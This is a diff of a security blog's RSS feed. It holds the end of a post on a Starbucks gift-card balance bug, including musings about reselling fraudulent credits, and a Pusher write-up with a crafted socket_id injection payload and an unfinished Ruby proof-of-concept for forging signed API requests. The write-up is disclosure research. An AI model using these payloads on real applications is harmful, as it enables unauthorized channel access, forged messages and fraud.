+&lt;p&gt;Let’s visit the nearest Starbucks at Market st.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Can I have anything for $16?&lt;/li&gt;
+  &lt;li&gt;O_o&lt;/li&gt;
+  &lt;li&gt;What’s most expensive thing here?&lt;/li&gt;
+  &lt;li&gt;That sandwich, I guess.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/sbstuff.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/sbcheck.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;$15 in, $16.70 out. The concept is proven and now let’s deposit $10 from our credit card to make sure the US justice system will not put us in jail over $1.70.&lt;/p&gt;
+
+&lt;p&gt;The hardest part - responsible disclosure. Support guy honestly answered there’s absolutely no way to get in touch with technical department and he’s sorry I feel this way. Emailing InformationSecurityServices@starbucks.com on March 23 was futile (and it only was answered on Apr 29). After trying really hard to find anyone who cares, I managed to get this bug fixed in like 10 days.&lt;/p&gt;
+
+&lt;p&gt;The unpleasant part is a guy from Starbucks calling me with nothing like “thanks” but mentioning “fraud” and “malicious actions” instead. Sweet!&lt;/p&gt;
+
+&lt;p&gt;So what could I do to not feel like an idiot looking for troubles? I could create a simple bunch of fake gift cards bought around the world, silently generate credits on them and sell Starbucks credits online for Bitcoin with, say, 50% discount. It would easily make me a couple of millions of dollars unless Starbucks actually tracks gift card balances. I don’t know for sure, it’s just a wild guess that this bug could be pretty profitable.&lt;/p&gt;
+</description>
+        <pubDate>Thu, 21 May 2015 00:00:00 +0300</pubDate>
+        <link>https://sakurity.com/blog/2015/05/21/starbucks.html</link>
+        <guid isPermaLink="true">https://sakurity.com/blog/2015/05/21/starbucks.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>Hacking Pusher with simple crypto vulnerability</title>
+        <description>&lt;p&gt;Specially crafted “socket_id” parameter could get us a valid auth for any private Pusher channel of your application and even forge any requests to Pusher API on behalf of your application if it has authentication endpoint for private channels (usally /pusher/auth).&lt;/p&gt;
+
+&lt;h2 id=&quot;briefly-about-pusher&quot;&gt;Briefly about Pusher&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/pusherlogo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Pusher is powering realtime communications and delivers over 40B messages each month. Publisher sends messages to different channels: “public-announcement”, “private-123-messages” etc. Users (mobile apps, web frontends etc) can subscribe to those channels.&lt;/p&gt;
+
+&lt;p&gt;Some channels are public, but most of the time clients need private channels to securely notify their users with messages like “John just sent you $10”.&lt;/p&gt;
+
+&lt;p&gt;Pusher gives you 3 config values: app_id = ‘99759’, key = ‘840543d97de9803651b1’ (public key of your access token), secret = ‘8897fad3dbbb3ac533a9’ (secret key to sign API requests and authenticate private channels)&lt;/p&gt;
+
+&lt;p&gt;Every time the user connects to Pusher’s websocket it responds with current socket_id (looks like 45031.26030316). If this user wants to subscribe to private channels (say, private-123 for user_id=123) they need to get signed “auth” object from the server side and pass it to Pusher. Normally it’s a POST request to /pusher/auth?socket_id=45031.26030316&amp;amp;channel=private-123&lt;/p&gt;
+
+&lt;p&gt;The server side code is supposed to use SDK. Example for Rails (&lt;a href=&quot;https://github.com/search?q=Pusher+authenticate&amp;amp;ref=searchresults&amp;amp;type=Code&amp;amp;utf8=%E2%9C%93&quot;&gt;they all look the same&lt;/a&gt;):&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Pusher[&quot;private-#{current_user.id}&quot;].authenticate(params[:socket_id])&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;returns&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;auth&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;387954142406c3c9cc13:a50a2e82cc3f8ea384fde78b28b680fc3f2de4fb3f8c36e87b0cd6d698353ab3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;. Sending this token back to Pusher websocket will subscribe you to &lt;code class=&quot;highlighter-rouge&quot;&gt;private-123&lt;/code&gt; channel.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://sakurity.com/img/pushersub.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;format-injection-in-authenticateparamssocket_id&quot;&gt;Format injection in authenticate(params[:socket_id])&lt;/h2&gt;
+
+&lt;p&gt;Let’s take a closer look at signing process in SDKs and see classic Format Injection vulnerability:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;authenticate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kp&quot;&gt;nil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;MultiJson&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;string_to_sign&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;compact&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;':'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@client&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;authentication_token&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OpenSSL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Digest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;SHA256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;OpenSSL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;HMAC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;secret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string_to_sign&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signature&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:channel_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;custom_data&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It calculates HMAC of &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;socket_id&amp;gt;:&amp;lt;channel_name&amp;gt;(:&amp;lt;channel_data&amp;gt;)&lt;/code&gt; using API secret, and channel_data is optional 3rd parameter. In our case string to sign is &lt;code class=&quot;highlighter-rouge&quot;&gt;45031.26030316:private-123&lt;/code&gt;. Name of the channel is strictly validated, but &lt;strong&gt;socket_id coming directly from user input is inserted as is&lt;/strong&gt;. Therefore sending socket_id=&lt;code class=&quot;highlighter-rouge&quot;&gt;45031.26030316:private-1&lt;/code&gt; gets us a signature of &lt;code class=&quot;highlighter-rouge&quot;&gt;45031.26030316:private-1:private-123&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;With this signature we can subscribe to private-1 or any other channel, sending the last part &lt;code class=&quot;highlighter-rouge&quot;&gt;private-123&lt;/code&gt; of string-to-sign in channel_data parameter (which comes in really handy because Pusher doesn’t verify if it’s valid JSON).&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;event&quot;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:&quot;pusher:subscribe&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;data&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;auth&quot;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:&quot;387954142406c3c9cc13:a50a2e82cc3f8ea384fde78b28b680fc3f2de4fb3f8c36e87b0cd6d698353ab3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;channel&quot;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:&quot;private-1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;channel_data&quot;&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:&quot;private-123&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Pusher verifies the token for private-1 by computing HMAC of socket_id=45031.26030316 + channel_name=private-1 + channel_data=private-123 and it is equal one we have for socket_id=&lt;code class=&quot;highlighter-rouge&quot;&gt;45031.26030316:private-1&lt;/code&gt; + channel_name=private-123&lt;/p&gt;
+
+&lt;p&gt;This is how we can subscribe to arbitrary private channel of vulnerable Pusher client. But it’s only the beginning of the story.&lt;/p&gt;
+
+&lt;h2 id=&quot;api-requests-also-use-hmac&quot;&gt;API requests also use HMAC&lt;/h2&gt;
+
+&lt;p&gt;Pusher documentation says you need to provide key:secret pair in your configuration &lt;code class=&quot;highlighter-rouge&quot;&gt;Pusher.url = &quot;https://840543d97de9803651b3:8897fad3dbb53ac533a9@api.pusherapp.com/apps/99759&quot;&lt;/code&gt; but in fact since https:// is preferred (performance reasons, I guess) SDKs never send the secret in plain text and use a &lt;a href=&quot;https://github.com/mloughran/signature&quot;&gt;home-baked “signature” gem&lt;/a&gt; instead.&lt;/p&gt;
+
+&lt;p&gt;That gem signs payloads the same way, with HMAC and API secret.&lt;/p&gt;
+
+&lt;h2 id=&quot;abusing-authenticateuser_input-to-sign-malicious-api-requests&quot;&gt;Abusing authenticate(user_input) to sign malicious API requests&lt;/h2&gt;
+
+&lt;p&gt;Technically, every client with Pusher[‘channel’].authenticate on the backend can sign arbitrary string for you. The signature gem uses following format: [request.method, request.path, request.query_string].join(“\n”).&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;POST&lt;/span&gt;
+&lt;span class=&quot;sr&quot;&gt;/apps/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99759&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;events&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;840543&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d97de9803651b1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1431504423&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body_md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e26738bad6c25794e97e2ca92bd7b1&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Unfortunatelly method “authenticate” appends the name of the channel so we only can get a signature of following string:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;POST&lt;/span&gt;
+&lt;span class=&quot;sr&quot;&gt;/apps/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;99759&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;events&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;840543&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d97de9803651b1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_timestamp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1431504423&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body_md5&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;90&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e26738bad6c25794e97e2ca92bd7b1&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:private&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;At first glance it looks like a serious obstacle, &lt;code class=&quot;highlighter-rouge&quot;&gt;:&lt;/code&gt; is supposed to be URL encoded in query strings as &lt;code class=&quot;highlighter-rouge&quot;&gt;%3A&lt;/code&gt;. There’s no way to get this exact string_to_sign on Pusher server side… Oh wait.&lt;/p&gt;
+
+&lt;h2 id=&quot;signature-library-does-not-encode-query-parameters&quot;&gt;“signature” library does not encode query parameters&lt;/h2&gt;
+
+&lt;p&gt;There’s another subtle vulnerability in “signature” gem - it &lt;strong&gt;intentionally ignores URL encoding&lt;/strong&gt;, no idea why.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;string_to_sign&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parameter_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;parameter_string&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;param_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@query_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;merge&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@auth_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{})&lt;/span&gt;
+
+  &lt;span class=&quot;c1&quot;&gt;# Convert keys to lowercase strings&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{};&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;param_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;each&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;downcase&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;c1&quot;&gt;# Exclude signature from signature generation!&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;auth_signature&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+  &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;map&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
+    &lt;span class=&quot;no&quot;&gt;QueryEncoder&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode_param_without_escaping&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;amp;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;This gem might be used in other projects so this is another vulnerability: if the attacker manages to eavesdrop/MitM a request with user input in some parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;message=%26parameter%3D0%26another_parameter%3D1&lt;/code&gt;, the same signature will be valid for &lt;code class=&quot;highlighter-rouge&quot;&gt;message=&amp;amp;parameter=0&amp;amp;another_parameter=1&lt;/code&gt; thus any parameters in the signed payload can be added or tampered with. &lt;strong&gt;Encoding is no joke.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Alright, since we know Pusher does not URL encode the query string, we can simply hide the last “:private-123” part in some dummy parameter and send it as a part of the query &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;dummy=:private-123&lt;/code&gt;. Here is my proof of concept.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'digest'&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'pusher'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'840543d97de9803651b1'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/apps/99759/events&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{&quot;data&quot;:&quot;{\&quot;message\&quot;:\&quot;FAKE EVENT\&quot;}&quot;,&quot;name&quot;:&quot;my_event&quot;,&quot;channel&quot;:&quot;test_channel&quot;}'&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;dummy_channel&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'test_channel'&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;md5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Digest&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;MD5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# for body integrity&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;stamp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;now&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;to_i&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# must be within 600 seconds of Pusher time&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Now lets obtain a signature for crafted socket_id&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# This is server side of the victim&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
